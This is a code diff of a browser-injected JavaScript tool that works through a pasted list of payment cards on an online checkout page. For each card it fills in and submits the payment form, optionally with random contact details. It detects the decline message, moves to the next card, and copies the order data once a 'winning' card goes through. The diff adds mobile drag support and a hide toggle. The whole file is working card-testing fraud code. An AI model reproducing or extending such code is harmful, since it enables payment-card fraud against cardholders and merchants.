@@ -1,12 +1,12 @@
 (async function(){
-    const UI_ID="slick-v6-precision-sync";
+    const UI_ID="slick-v6-mobile";
     const FAIL_TEXT="We are sorry, but we are unable to process your payment.";
     
     let existing=document.getElementById(UI_ID);
     if(existing){existing.remove()}
     
     let state={observer:null,queue:[],index:0,isRunning:false};
-    window.slickLock = false; // THE SYNC LOCK
+    window.slickLock = false; 
     
     const utils={
         randAlpha:(n)=>Array.from({length:n},()=>"abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random()*36)]).join(''),
@@ -54,7 +54,6 @@
         const winningCard=state.queue[state.index-1];
         const orderData=sessionStorage.getItem("lastPlacedOrder");
         
-        // DISPLAY CARD IN UI
         const sucBox=document.getElementById("af-success");
         if(sucBox){
             sucBox.style.display="block";
@@ -62,7 +61,6 @@
         }
         updateStat("CHECKOUT SUCCESS","#0f0");
         
-        // ONLY COPY DOMS DATA
         if(orderData){
             let domsText=`/doms data: ${ orderData }`;
             let copied=utils.copy(domsText);
@@ -76,7 +74,7 @@
     function fillAndSubmit(card){
         if(!card){return}
         
-        window.slickLock = true; // LOCK OBSERVER WHILE TYPING
+        window.slickLock = true; 
         
         const radioBtn=document.getElementById('payment-type-card');
         const radioLabel=document.querySelector('label[for="payment-type-card"]');
@@ -95,10 +93,9 @@
             const b=document.querySelector('button[type="submit"]');
             if(b&&!b.disabled){
                 b.click();
-                // Keep locked for 1.2s to wait for site loading spinner to pass
                 setTimeout(() => { window.slickLock = false; }, 1200);
             } else {
-                window.slickLock = false; // Unlock if button missing
+                window.slickLock = false;
             }
         },500)
     }
@@ -125,7 +122,7 @@
             
             state.index=0;
             state.isRunning=true;
-            window.slickLock = false; // Reset lock on start
+            window.slickLock = false; 
             document.getElementById("af-success").style.display="none";
             
             if(document.getElementById("af-chk").checked){
@@ -138,12 +135,10 @@
             }
             
             state.observer=new MutationObserver((mutations)=>{
-                // Success check happens REGARDLESS of lock
                 const isConfirmed=Array.from(document.querySelectorAll('h1')).some(h1=>h1.textContent.includes("Order Confirmation"));
                 const cardInputGone=document.querySelector("input[name='cardNumber']")===null;
                 if(isConfirmed&&cardInputGone){handleSuccess();return}
                 
-                // IF LOCKED, DO NOT CHECK FOR ERRORS
                 if(window.slickLock) return;
                 
                 let failDetected=false;
@@ -158,7 +153,7 @@
                 }
                 
                 if(failDetected&&state.isRunning){
-                    window.slickLock = true; // Instantly lock to prevent double fire
+                    window.slickLock = true; 
                     tryNext()
                 }
             });
@@ -168,13 +163,14 @@
         }catch(e){alert("Format Error")}
     }
     
+    /* --- UI CREATION --- */
     const s=document.createElement("style");
     s.innerHTML=`#${ UI_ID } { position: fixed; top: 15px; right: 15px; width: 250px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; z-index: 999999; font-family: monospace; color: #eee; padding: 12px; } .af-h { cursor: move; font-size: 10px; color: #555; display: flex; justify-content: space-between; margin-bottom: 8px; } #af-txt { width: 100%; background: #000; border: 1px solid #222; color: #0f0; font-size: 10px; padding: 6px; box-sizing: border-box; } .af-b { display: flex; gap: 4px; margin-top: 8px; } .af-b button { flex: 1; font-size: 10px; padding: 6px; cursor: pointer; background: #111; color: #eee; border: 1px solid #444; } #af-success { display: none; background: #0b1a0b; border: 1px solid #238636; color: #0f0; font-size: 9px; padding: 6px; margin-top: 8px; word-break: break-all; }`;
     document.head.appendChild(s);
     
     const ui=document.createElement("div");
     ui.id=UI_ID;
-    ui.innerHTML=`<div class="af-h" id="af-drag"><span>V6.7_DOMS_ONLY</span><span id="af-stat">IDLE</span></div><div style="font-size:9px;margin-bottom:5px">RAND_CONTACT <input type="checkbox" id="af-chk" checked></div><textarea id="af-txt" rows="5"></textarea><div class="af-b"><button id="af-run">RUN</button><button id="af-clr">CLR</button><button id="af-stop">STOP</button></div><div id="af-success"></div>`;
+    ui.innerHTML=`<div class="af-h" id="af-drag"><span>V6.8_MOBILE</span><div style="display:flex;gap:10px;"><span id="af-stat">IDLE</span><span id="af-min-btn" style="cursor:pointer;color:#bbb;font-weight:bold;">[ > ]</span></div></div><div style="font-size:9px;margin-bottom:5px">RAND_CONTACT <input type="checkbox" id="af-chk" checked></div><textarea id="af-txt" rows="5"></textarea><div class="af-b"><button id="af-run">RUN</button><button id="af-clr">CLR</button><button id="af-stop">STOP</button></div><div id="af-success"></div>`;
     document.body.appendChild(ui);
     
     document.getElementById("af-run").onclick=startAll;
@@ -186,9 +182,65 @@
         updateStat("STOPPED","#f44")
     };
     
-    let drag=false,off=[0,0];
-    document.getElementById("af-drag").onmousedown=(e)=>{drag=true;off=[ui.offsetLeft-e.clientX,ui.offsetTop-e.clientY]};
-    document.onmousemove=(e)=>{if(drag){ui.style.left=(e.clientX+off[0])+'px';ui.style.top=(e.clientY+off[1])+'px'}};
-    document.onmouseup=()=>drag=false
-})();
+    /* --- MINIMIZE / HIDE LOGIC --- */
+    let isMin = false;
+    const toggleMin = (e) => {
+        if(e) e.stopPropagation();
+        isMin = !isMin;
+        if(isMin) {
+            ui.dataset.oldLeft = ui.style.left || '';
+            ui.dataset.oldTop = ui.style.top || '';
+            ui.style.transition = 'transform 0.3s ease, right 0.3s ease';
+            ui.style.left = 'auto';
+            ui.style.right = '0px';
+            ui.style.transform = 'translateX(calc(100% - 20px))'; // Leaves 20px sticking out
+            ui.style.opacity = '0.6';
+        } else {
+            ui.style.transform = 'none';
+            ui.style.right = '15px';
+            if(ui.dataset.oldLeft) {
+                ui.style.left = ui.dataset.oldLeft;
+                ui.style.top = ui.dataset.oldTop;
+                ui.style.right = 'auto';
+            }
+            ui.style.opacity = '1';
+            setTimeout(() => ui.style.transition = 'none', 300); // Remove transition so dragging is smooth
+        }
+    };
+    document.getElementById("af-min-btn").onclick = toggleMin;
+    ui.onclick = (e) => { if(isMin) toggleMin(e); };
 
+    /* --- MOBILE + DESKTOP DRAG LOGIC --- */
+    let drag=false, off=[0,0];
+    const dragHeader = document.getElementById("af-drag");
+
+    const dragStart = (e) => {
+        if(e.target.id === 'af-min-btn') return;
+        drag = true;
+        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        off = [ui.offsetLeft - clientX, ui.offsetTop - clientY];
+    };
+    
+    const dragMove = (e) => {
+        if(!drag || isMin) return;
+        if(e.touches) e.preventDefault(); // Stop mobile screen from scrolling while dragging UI
+        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+        ui.style.left = (clientX + off[0]) + 'px';
+        ui.style.top = (clientY + off[1]) + 'px';
+        ui.style.right = 'auto';
+    };
+    
+    const dragEnd = () => { drag = false; };
+
+    // Desktop
+    dragHeader.addEventListener('mousedown', dragStart);
+    document.addEventListener('mousemove', dragMove);
+    document.addEventListener('mouseup', dragEnd);
+
+    // Mobile (Touch)
+    dragHeader.addEventListener('touchstart', dragStart, {passive: true});
+    document.addEventListener('touchmove', dragMove, {passive: false}); // passive false allows preventDefault
+    document.addEventListener('touchend', dragEnd);
+})();
